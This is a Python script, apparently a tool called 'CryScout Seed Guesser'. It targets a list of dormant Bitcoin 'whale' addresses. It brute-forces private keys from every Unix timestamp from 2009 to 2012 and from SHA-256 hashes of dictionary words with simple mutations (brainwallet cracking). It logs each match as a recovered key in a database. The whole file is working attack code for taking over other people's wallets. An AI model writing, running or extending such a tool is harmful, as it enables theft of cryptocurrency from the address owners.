#!/usr/bin/env python3
"""
CryScout Seed Guesser — Massive Expansion
"""
import hashlib
import hmac
import struct
import itertools
import time
import os
import ecdsa
import base58
import pandas as pd
from mnemonic import Mnemonic
from db_manager import get_connection, add_recovered_key, add_finding

M = Mnemonic("english")
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def pubkey_to_address(pubkey_bytes):
    sha = hashlib.sha256(pubkey_bytes).digest()
    h160 = hashlib.new('ripemd160', sha).digest()
    vh = b'\x00' + h160
    checksum = hashlib.sha256(hashlib.sha256(vh).digest()).digest()[:4]
    return base58.b58encode(vh + checksum).decode()

def privkey_to_addresses(pk_bytes):
    try:
        pk_int = int.from_bytes(pk_bytes, 'big')
        if pk_int <= 0 or pk_int >= P: return []
        sk = ecdsa.SigningKey.from_secret_exponent(pk_int, curve=ecdsa.SECP256k1)
        vk = sk.get_verifying_key()
        return [pubkey_to_address(vk.to_string("compressed")), pubkey_to_address(vk.to_string("uncompressed"))]
    except: return []

def run_massive_targeted_scan():
    try:
        df = pd.read_csv("dormant_addresses.csv")
        target_addresses = set(df['Address'].tolist())
        print(f"Loaded {len(target_addresses)} whale targets")
    except:
        return

    print("Starting MASSIVE expansion scan...")
    
    # 1. TIME TRAVEL ATTACK: Check all seconds from 2009 to 2012
    # 2009-01-01: 1230768000
    # 2012-01-01: 1325376000
    start_ts = 1230768000
    end_ts = 1325376000
    
    print(f"Checking timestamps from {start_ts} to {end_ts}...")
    for ts in range(start_ts, end_ts):
        if ts % 1000000 == 0: print(f"  Progress: {ts}")
        pk = ts.to_bytes(32, 'big')
        for a in privkey_to_addresses(pk):
            if a in target_addresses:
                print(f"!!! CRITICAL HIT: Timestamp {ts} -> {a}")
                add_recovered_key(a, pk.hex(), method=f"Timestamp: {ts}")

    # 2. DICTIONARY COMBINATIONS
    with open("extended_dictionary.txt", "r") as f:
        words = [line.strip() for line in f if line.strip()]
    
    print(f"Checking {len(words)} words with common mutations...")
    for word in words:
        # Try word, word123, Word, Word123, word!
        variants = [word, word+"123", word.capitalize(), word.capitalize()+"123", word+"!"]
        for v in variants:
            pk = hashlib.sha256(v.encode()).digest()
            for a in privkey_to_addresses(pk):
                if a in target_addresses:
                    print(f"!!! HIT: Phrase '{v}' -> {a}")
                    add_recovered_key(a, pk.hex(), method=f"Brainwallet: {v}")

    print("Massive scan complete.")

if __name__ == "__main__":
    run_massive_targeted_scan()
